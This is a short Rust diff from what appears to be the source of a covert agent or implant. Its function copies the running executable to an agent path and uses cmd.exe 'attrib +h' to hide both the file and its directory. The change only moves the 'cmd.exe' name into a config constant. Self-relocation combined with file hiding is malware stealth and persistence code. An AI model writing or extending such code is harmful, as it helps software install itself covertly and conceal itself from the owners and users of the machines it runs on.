@@ -22,11 +22,11 @@ pub fn move_to_desired_dir() {
         fs::copy(env::current_exe().unwrap(), &config::filesystem::AGENT_PATH).unwrap();
 
         // set both agent dir and executable to be hidden
-        let _add_h_dir = process::Command::new("cmd.exe")
+        let _add_h_dir = process::Command::new(config::commands::CLI)
             .args(&["/Q", "/C", "attrib", "+h", &config::filesystem::AGENT_PATH])
             .spawn()
             .unwrap();
-        let _add_h_file = process::Command::new("cmd.exe")
+        let _add_h_file = process::Command::new(config::commands::CLI)
             .args(&["/Q", "/C", "attrib", "+h", &config::filesystem::DESIRED_DIR])
             .spawn()
             .unwrap();
